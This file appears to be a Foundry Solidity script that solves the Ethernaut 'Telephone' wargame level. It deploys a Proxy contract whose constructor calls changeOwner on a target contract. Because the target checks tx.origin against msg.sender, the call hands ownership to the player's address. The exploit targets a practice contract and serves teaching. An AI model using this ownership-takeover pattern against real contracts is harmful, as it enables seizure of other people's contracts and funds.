// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Telephone} from "../src/EthernautTelephone.sol";

contract TelephoneSolution is Script {
    Telephone telephone = Telephone(0x1B629936742AEB1c94Db597F5BC149FecA76F095);
    Proxy proxy;

    function run() public {
        console.log("Current owner is", telephone.owner());
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        proxy = new Proxy(telephone, address(vm.envAddress("MY_ADDRESS")));
        // telephone.changeOwner(address(vm.envAddress("MY_ADDRESS")));
        console.log("After call, current owner is", telephone.owner());
    }
}

contract Proxy { // Act as tx.origin, MY_ADDRESS will be msg.sender
    constructor(Telephone _telephone, address newOwner) {
        _telephone.changeOwner(address(newOwner));
    }
}
